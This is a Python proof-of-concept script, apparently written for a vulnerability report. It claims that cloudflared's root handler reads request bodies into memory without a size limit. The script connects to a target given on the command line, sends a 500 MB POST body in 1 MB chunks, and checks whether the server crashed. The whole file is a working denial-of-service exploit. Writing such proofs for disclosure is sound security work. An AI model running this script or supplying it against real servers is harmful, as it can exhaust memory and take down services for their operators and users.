#!/usr/bin/env python3
"""
PoC: Unbounded Request Body Consumption (OOM)

Demonstrates that the root handler reads the entire request body into memory
via io.ReadAll(r.Body) without any size limit.

Usage:
    python3 poc_oom.py http://localhost:8080

Impact: cloudflared memory grows proportionally to request size. A large
enough body causes OOM termination.
"""

import sys
import socket
import time
from urllib.parse import urlparse

PAYLOAD_SIZE_MB = 500  # 500 MB — enough to demonstrate clear memory impact

def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target_url>")
        print(f"Example: {sys.argv[0]} http://localhost:8080")
        sys.exit(1)

    url = urlparse(sys.argv[1])
    host = url.hostname or "localhost"
    port = url.port or 80

    payload_size = PAYLOAD_SIZE_MB * 1024 * 1024

    print(f"[*] Target: {host}:{port}")
    print(f"[*] Sending POST with {PAYLOAD_SIZE_MB} MB body")
    print(f"[*] Monitor cloudflared memory: watch -n1 'ps -o pid,rss,comm -p $(pgrep cloudflared)'")
    print()

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))

    # Send HTTP headers
    headers = (
        f"POST / HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        f"Content-Length: {payload_size}\r\n"
        f"Content-Type: application/octet-stream\r\n"
        f"\r\n"
    )
    sock.sendall(headers.encode())

    # Send body in 1 MB chunks
    chunk = b"A" * (1024 * 1024)
    sent = 0
    start = time.time()

    for i in range(PAYLOAD_SIZE_MB):
        try:
            sock.sendall(chunk)
            sent += len(chunk)
            elapsed = time.time() - start
            print(f"\r[*] Sent {sent // (1024*1024)} MB / {PAYLOAD_SIZE_MB} MB ({elapsed:.1f}s)", end="", flush=True)
        except BrokenPipeError:
            print(f"\n[!] Connection closed by server after {sent // (1024*1024)} MB — server may have crashed")
            break

    print()
    elapsed = time.time() - start
    print(f"[*] Done in {elapsed:.1f}s")
    print(f"[*] Check if cloudflared is still running: pgrep -a cloudflared")

    try:
        response = sock.recv(4096)
        print(f"[*] Response received ({len(response)} bytes) — server survived but consumed ~{PAYLOAD_SIZE_MB} MB")
    except Exception as e:
        print(f"[!] No response — server likely crashed: {e}")

    sock.close()

if __name__ == "__main__":
    main()
